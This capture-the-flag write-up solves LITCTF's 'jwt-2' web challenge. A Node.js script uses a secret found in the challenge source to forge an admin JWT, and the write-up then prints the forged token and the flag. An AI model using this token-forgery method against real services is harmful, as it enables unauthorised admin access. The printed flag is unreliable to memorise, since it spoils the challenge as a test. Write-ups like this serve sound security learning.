---
title: jwt-2
date: 2023-12-10T13:37:49+02:00
author: zacian
tags:
  - Web
draft: false
---

## Description

its like jwt-1 but this one is harder URL: http://litctf.org:31777/

Author : halp

## Solution

The challenge provide us with a typescript file. 

The challenge seems have the same site as [jwt-1](./jwt-1.md) but the jwt signing and checking process is different and using the old techniue of changing the value won't work straight.

What we can do is, use the same process or logic from the given script to sign our own JWT 

Since, a JWT mainly contains three parts that being the Header, Payload and Signaturel, we can extract those specific part of logic from the main script and put in our own script.

```js
const crypto = require('crypto');
const jwtSecret = "xook";

const jwtHeader = Buffer.from(
    JSON.stringify({ alg: "HS256", typ: "JWT" }),
    "utf-8"
).toString("base64").replace(/=/g, "");

payload = { name: 'username', admin: true }; // changed admin value from flase to true

const jwtPayload = Buffer.from(JSON.stringify(payload), "utf-8").toString("base64").replace(/=/g, "");
const signature  = crypto.createHmac('sha256', jwtSecret).update(jwtHeader + '.' + jwtPayload).digest('base64').replace(/=/g, '');

console.log(jwtHeader + "." + jwtPayload + "." + signature);
```

This would create a JWT token when we run the code `node script.js`

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidXNlcm5hbWUiLCJhZG1pbiI6dHJ1ZX0.bc2aVoMm2M4q/twCx9BCiOABaQU0TKegvLkGolRcbHE
```

Now changing or providing the cookie/token value would give us the flag 

```
Flag : LITCTF{v3rifyed_thI3_Tlme_1re4DV9}
```
